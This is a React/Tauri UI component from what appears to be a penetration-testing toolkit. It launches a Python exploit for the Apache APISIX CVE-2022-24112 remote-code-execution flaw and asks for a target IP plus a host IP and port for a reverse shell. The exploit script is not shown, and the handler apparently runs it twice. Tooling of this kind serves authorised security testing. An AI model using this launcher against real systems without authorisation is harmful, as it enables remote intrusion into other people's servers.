import { Button, LoadingOverlay, NumberInput, Stack, TextInput } from "@mantine/core";
import { useForm } from "@mantine/form";
import { useCallback, useState } from "react";
import { CommandHelper } from "../../utils/CommandHelper";
import ConsoleWrapper from "../ConsoleWrapper/ConsoleWrapper";
import { Child, Command } from "@tauri-apps/api/shell";
import { IconDoorExit } from "@tabler/icons";
import { UserGuide } from "../UserGuide/UserGuide";
import { SaveOutputToTextFile_v2 } from "../SaveOutputToFile/SaveOutputToTextFile"; //v2

/**
 * FormValues defines the structure of the object used to hold form state for network configuration.
 *
 * @field hostIP: The IP address of the host machine.
 * @field targetIP: The IP address of the target machine.
 * @field hostPort: The port number on the host machine used for communication.
 */
interface FormValuesType {
    hostIP: string;
    targetIP: string;
    hostPort: number;
}

const title = "Apache APISIX Remote Code Execution (CVE 2022-24112)";
const description_userguide =
    "The Apache APISIX attack vector grants an attacker the opportunity to exploit the IP restriction of Admin API " +
    "through the use of the batch-requests plugin. Within Apache APISIX that utilises the default API key, the " +
    "configuration stands vulnerable to remote code execution. The impact of this attack vector lowers when the admin " +
    "key or port for the Admin API have been changed, although still withholds potential to bypass Apache APISIX’s IP " +
    "restriction on the data panel.\n\nFurther information can be found at: https://github.com/M4xSec/Apache-" +
    "APISIX-CVE-2022-24112\n\n" +
    "Using Apache APISIX Remote Code Execution:\n" +
    "Step 1: Enter a Host IP (enter your machine’s IP for the reverse shell).\n" +
    "       Eg: 192.168.0.1\n\n" +
    "Step 2: Enter a Host Port (for reverse shell).\n" +
    "       Eg: 4444\n\n" +
    "Step 3: Enter a Target IP or Hostname\n" +
    "       Eg: 127.0.0.1\n\n" +
    "Step 4: Click Exploit to commence the exploits operation.\n\n" +
    "Step 5: View the Output block below to view the results of the attack vectors execution.";

/**
 * CVE20224112 is a React component that renders a form to execute
 * the Apache APISIX CVE-2022-24112 exploit.
 * It handles form submission, command execution, and output display.
 *
 * @returns A form component for executing the CVE-2022-24112 exploit.
 */
export function CVE202224112() {
    // State to manage the loading indicator visibility
    const [loading, setLoading] = useState(false);
    // State to store the handle of the spawned command process
    const [handle, setHandle] = useState<Child | null>(null);
    // State to store the command output
    const [output, setOutput] = useState("");
    // State to store the first status message
    const [text1, setText1] = useState<string | null>(null);
    // State to store the second status message
    const [text2, setText2] = useState<string | null>(null);
    // State to manage whether saving the output to a file is allowed
    const [allowSave, setAllowSave] = useState(false);
    // State to track if the output has been saved
    const [hasSaved, setHasSaved] = useState(false);

    // Initialize the form with default values
    let form = useForm({
        initialValues: {
            hostIP: "",
            targetIP: "",
            hostPort: 4444,
        },
    });
    /**
     * Handles form submission, executes the exploit command, and updates the output state.
     *
     * @param values - The form values containing host IP, target IP, and host port.
     */
    const onSubmit = async (values: FormValuesType) => {
        setLoading(true);

        // Disallow saving until the tool's execution is complete
        setAllowSave(false);

        const args = ["./exploits/CVE-2022-24112.py", values.targetIP, values.hostIP, `${values.hostPort}`];

        const command = new Command("python3", args);
        const newHandle = await command.spawn();

        const output = await CommandHelper.runCommand("python3", args);

        const text1 = `Attacking Target URL: ${values.targetIP}...`;
        const text2 = "Check your netcat listener for a reverse shell...";

        setText1(text1);
        setText2(text2);

        setHandle(newHandle);
        setOutput(output);
        setLoading(false);
        setAllowSave(true);
    };

    /**
     * Kills the currently running exploit command if there is one.
     */
    const killHandle = async () => {
        if (handle) {
            await handle.kill();
            setHandle(null);
            setText1(null);
            setText2(null);
        }
    };

    /**
     * Clears the output and resets save states.
     */
    const clearOutput = useCallback(() => {
        setOutput("");
        setHasSaved(false);
        setAllowSave(false);
    }, [setOutput]);

    /**
     * Callback for handling the completion of the output save operation.
     * Resets the save state to prevent duplicate saving.
     */
    const handleSaveComplete = () => {
        // Indicating that the file has saved which is passed
        // back into SaveOutputToTextFile to inform the user
        setHasSaved(true);
        setAllowSave(false);
    };

    return (
        <form onSubmit={form.onSubmit((values) => onSubmit({ ...values }))}>
            <LoadingOverlay visible={loading} />
            <Stack>
                {UserGuide(title, description_userguide)}
                <TextInput
                    label={"Host IP (your machine, for the reverse shell)"}
                    required
                    {...form.getInputProps("hostIP")}
                />
                <NumberInput label={"Host port (for reverse shell)"} {...form.getInputProps("hostPort")} />
                <TextInput label={"Target IP or Hostname"} required {...form.getInputProps("targetIP")} />

                <Button type={"submit"}>Exploit</Button>
                {SaveOutputToTextFile_v2(output, allowSave, hasSaved, handleSaveComplete)}
                <ConsoleWrapper output={output} clearOutputCallback={clearOutput} />
                {handle && (
                    <Button leftIcon={<IconDoorExit />} onClick={killHandle} color={"red"}>
                        Kill process
                    </Button>
                )}
            </Stack>
        </form>
    );
}
